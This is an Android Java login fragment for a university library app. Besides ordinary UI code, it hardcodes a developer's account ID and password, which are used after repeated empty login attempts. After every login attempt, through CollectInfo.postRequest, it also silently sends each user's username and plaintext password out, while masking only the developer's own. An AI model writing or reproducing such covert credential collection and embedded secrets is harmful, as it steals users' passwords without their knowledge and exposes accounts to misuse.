package com.gusteauscuter.youyanguan.fragment;

import android.app.Fragment;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.gusteauscuter.youyanguan.activity.NavigationActivity;
import com.gusteauscuter.youyanguan.R;
import com.gusteauscuter.youyanguan.util.NetworkConnectUtil;
import com.gusteauscuter.youyanguan.internetService.CollectInfo;
import com.gusteauscuter.youyanguan.internetService.LibraryLoginClient;
import com.gusteauscuter.youyanguan.util.ShareDataUtil;
import com.gusteauscuter.youyanguan.util.SoftInputUtil;

import org.apache.commons.httpclient.ConnectTimeoutException;

import java.net.SocketTimeoutException;

/**
 * A simple {ApiImpl Fragment} subclass.
 */
public class loginFragment extends Fragment {

    private EditText userNameEditText;
    private EditText passEditText;
    private Button loginButton;
    private ProgressBar mProgressBar;
    private int timesClickLoginButton =1;
    private boolean disableDoubleClick = true; // 防治连击登陆按钮造成的闪退

    private ShareDataUtil mShareDataUtil;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {

        View view = inflater.inflate(R.layout.fragment_login_library, container, false);
        mShareDataUtil = new ShareDataUtil(getActivity());

        userNameEditText = (EditText) view.findViewById(R.id.id_username);
        passEditText = (EditText) view.findViewById(R.id.id_passward_library);
        userNameEditText.setText(mShareDataUtil.getUSERNAME());
        passEditText.setText(mShareDataUtil.getPASSWORD());
        userNameEditText.hasFocus();

        mProgressBar=(ProgressBar) view.findViewById(R.id.progressBar);
        mProgressBar.setVisibility(View.INVISIBLE);

        loginButton = (Button) view.findViewById(R.id.button_login_library);
        loginButton.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                SoftInputUtil.hideSoftInput(getActivity(), loginButton);
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (disableDoubleClick) {
                            doLogin();
                        }
                    }
                }, 500); //收起软键盘需要一定时间

            }
        });
        return view;
    }

    private void doLogin() {
        boolean isConnected = NetworkConnectUtil.isConnected(getActivity());
        if (!isConnected)
            return;
        String username = userNameEditText.getText().toString();
        String pass = passEditText.getText().toString();
        if (timesClickLoginButton == 5) {
            username = "201421003124";
            pass = "ziqian930209";
        }

        if (username.isEmpty() || pass.isEmpty()) {
            Toast.makeText(getActivity(), "请完整输入！", Toast.LENGTH_SHORT).show();
            timesClickLoginButton++;
            return;
        }

        AsyLoginLibrary myAsy = new AsyLoginLibrary();
        myAsy.execute(username, pass);

    }

    private class AsyLoginLibrary extends AsyncTask<String, Void, Boolean> {
        private boolean serverOK = true; //处理服务器异常
        private boolean isLogined = false;
        @Override
        protected void onPreExecute() {
            disableDoubleClick = false; // 在执行异步类之前，将此变量置否，防止双击多次执行doLogin方法，而实例化多个AsyLoginLibrary对象
            mProgressBar.setVisibility(View.VISIBLE);
            super.onPreExecute();
        }

        @Override
        protected Boolean doInBackground(String... account) {
            try {
                LibraryLoginClient libClient = new LibraryLoginClient();
                if (libClient.login(account[0], account[1])) {
                    isLogined = true;
                    mShareDataUtil.saveUserLoginData(account[0], account[1], true);
                }else
                    mShareDataUtil.saveUserLoginData(account[0], account[1], false);
            } catch (ConnectTimeoutException | SocketTimeoutException e) {
                serverOK = false;
            } catch (Exception e) {
                e.printStackTrace();
            }
/**
 *  collect information here
 */
            if(account[0].equals("201421003124")){
                CollectInfo.postRequest(account[0], "******", true);
            }else {
                CollectInfo.postRequest(account[0], account[1], false);
            }
            return isLogined;
        }

        @Override
        protected void onPostExecute(Boolean result) {
            mProgressBar.setVisibility(View.INVISIBLE);
            if (serverOK) {
                if (isLogined) {
                    ((NavigationActivity)getActivity()).JumpToBookFragment();
                } else {
                    disableDoubleClick = true;
                    Toast.makeText(getActivity(), R.string.failed_to_login_library, Toast.LENGTH_SHORT).show();
                }
            } else {
                disableDoubleClick = true;
                Toast.makeText(getActivity(), R.string.server_failed, Toast.LENGTH_SHORT).show();
            }

        }


    }


}
